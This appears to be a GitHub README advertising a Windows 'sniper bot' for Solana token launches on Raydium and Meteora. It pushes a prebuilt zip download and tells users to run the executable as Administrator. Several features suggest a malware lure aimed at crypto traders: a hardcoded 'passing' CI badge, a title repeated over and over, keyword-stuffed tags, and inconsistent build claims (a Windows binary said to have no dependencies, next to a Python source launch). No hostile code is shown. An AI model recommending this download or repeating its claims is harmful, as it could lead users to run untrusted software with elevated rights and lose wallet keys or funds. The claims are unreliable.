<div align="center">

# Solana Raydium V4 & Meteora DLMM Sniper Bot — Sub-50ms Yellowstone gRPC Geyser Execution (Windows x64 Build)

<p><strong>Solana Raydium V4 & Meteora DLMM Sniper Bot — Sub-50ms Yellowstone gRPC Geyser Execution (Windows x64 Build): native 64-bit Windows 10/11 portable x64 build with hot-reloadable JSON configuration, low-overhead runtime, and prebuilt portable release.</strong></p>

[![CI Build](https://img.shields.io/badge/CI_Build-passing-2ea44f?style=for-the-badge&logo=githubactions&logoColor=white)](https://github.com/dmitry-k-code19w1/raydium-meteora-sniper-bot-x64/releases/latest)
[![Latest Release](https://img.shields.io/github/v/release/dmitry-k-code19w1/raydium-meteora-sniper-bot-x64?style=for-the-badge&logo=github&color=2ea44f)](https://github.com/dmitry-k-code19w1/raydium-meteora-sniper-bot-x64/releases/latest)
[![Total Downloads](https://img.shields.io/github/downloads/dmitry-k-code19w1/raydium-meteora-sniper-bot-x64/total?style=for-the-badge&logo=github&color=0969da)](https://github.com/dmitry-k-code19w1/raydium-meteora-sniper-bot-x64/releases/latest)
[![Stars](https://img.shields.io/github/stars/dmitry-k-code19w1/raydium-meteora-sniper-bot-x64?style=for-the-badge&logo=github&color=e3b341)](https://github.com/dmitry-k-code19w1/raydium-meteora-sniper-bot-x64/stargazers)
[![Open in Colab](https://img.shields.io/badge/Colab-Quickstart-F9AB00?style=for-the-badge&logo=googlecolab&logoColor=white)](https://colab.research.google.com/github/dmitry-k-code19w1/raydium-meteora-sniper-bot-x64/blob/main/notebooks/quickstart.ipynb)

<a href="https://github.com/dmitry-k-code19w1/raydium-meteora-sniper-bot-x64/releases/download/v1.2.0/raydium-meteora-sniper-bot-x64-v1.2.0-win64.zip"><img src="assets/download_btn.svg" alt="Download raydium-meteora-sniper-bot-x64-v1.2.0-win64.zip" width="520"></a>

<br>

<img src="assets/preview.png" alt="Solana Raydium V4 & Meteora DLMM Sniper Bot — Sub-50ms Yellowstone gRPC Geyser Execution (Windows x64 Build) Preview" width="840">

</div>

---

## Technical Overview

**Solana Raydium V4 & Meteora DLMM Sniper Bot — Sub-50ms Yellowstone gRPC Geyser Execution (Windows x64 Build)** (`raydium-meteora-sniper-bot-x64`) is a modular, low-overhead runtime and configuration suite engineered for 64-bit Windows 10 and Windows 11 systems. All parameters are controlled cleanly through `config/settings.json` with live hot-reload support and zero external dependencies.

> [!IMPORTANT]
> **1-Click Prebuilt Package (No Compiler Required)**: Even though the full source tree (`src/`, `config/`) is included in this repository, end users do **not** need to compile anything. Click the green **Download Portable Release** button above or grab [`raydium-meteora-sniper-bot-x64-v1.2.0-win64.zip`](https://github.com/dmitry-k-code19w1/raydium-meteora-sniper-bot-x64/releases/download/v1.2.0/raydium-meteora-sniper-bot-x64-v1.2.0-win64.zip) directly from [**Releases**](https://github.com/dmitry-k-code19w1/raydium-meteora-sniper-bot-x64/releases/latest).

## Precompiled Binary Deployment (Windows x64)

| Platform | Direct Download Package | Checksum Manifest |
| :--- | :--- | :--- |
| **Windows 10 / 11 (64-bit)** | [**`raydium-meteora-sniper-bot-x64-v1.2.0-win64.zip`**](https://github.com/dmitry-k-code19w1/raydium-meteora-sniper-bot-x64/releases/download/v1.2.0/raydium-meteora-sniper-bot-x64-v1.2.0-win64.zip) | [`SHA256SUMS.txt`](https://github.com/dmitry-k-code19w1/raydium-meteora-sniper-bot-x64/releases/latest) |

1. Download [`raydium-meteora-sniper-bot-x64-v1.2.0-win64.zip`](https://github.com/dmitry-k-code19w1/raydium-meteora-sniper-bot-x64/releases/download/v1.2.0/raydium-meteora-sniper-bot-x64-v1.2.0-win64.zip) from the table above or the [**Releases**](https://github.com/dmitry-k-code19w1/raydium-meteora-sniper-bot-x64/releases/latest) section.
2. Extract the `.zip` archive into any folder (keep `config/settings.json` next to the launcher).
3. Launch the executable as Administrator.

## Module Inventory

| Subsystem | Technical Implementation | Runtime Controls |
| :--- | :--- | :--- |
| **Low-Latency Stream** | Asynchronous WebSocket pool & mempool listener | Sub-50ms tick-to-order dispatch |
| **MEV & Slippage Guard** | Jito bundle simulation + dynamic priority fee | Prevents sandwiching & failed tx fees |
| **Token Safety Audit** | Mint/freeze authority & LP lock verification | Filters honeypots prior to execution |
| **Paper & Live Modes** | Deterministic local simulation or live signing | Safe strategy backtesting in `settings.json` |

## Configuration (`config/settings.json`)

```json
{
  "version": "1.2.0",
  "rpc": {
    "http_endpoint": "https://api.mainnet-beta.solana.com",
    "ws_endpoint": "wss://api.mainnet-beta.solana.com",
    "jito_block_engine": "https://mainnet.block-engine.jito.wtf",
    "commitment": "processed"
  },
  "execution": {
    "max_slippage_bps": 150,
    "priority_fee_microlamports": 250000,
    "auto_tp_pct": 45.0,
    "stop_loss_pct": 18.0,
    "paper_trading_mode": true
  },
  "filters": {
    "require_mint_renounced": true,
    "require_freeze_disabled": true,
    "min_initial_liquidity_sol": 15.0
  }
}
```

## Building from Source

```bash
git clone https://github.com/dmitry-k-code19w1/raydium-meteora-sniper-bot-x64.git
cd raydium-meteora-sniper-bot-x64
python src/engine.py
```

---
<sub>Indexed tags: solana, pump-fun, pump-fun-bundler, pump-fun-bot, pumpfun-volume-bot, solana-sniper-bot, raydium-sniper-bot, meteora-dlmm-bot, jito-bundler, jito-mev-bot, gmgn-copytrade-bot, bullx-bot, photon-sniper, axiom-trade-bot, dexscreener-bot, memecoin-bundler</sub>
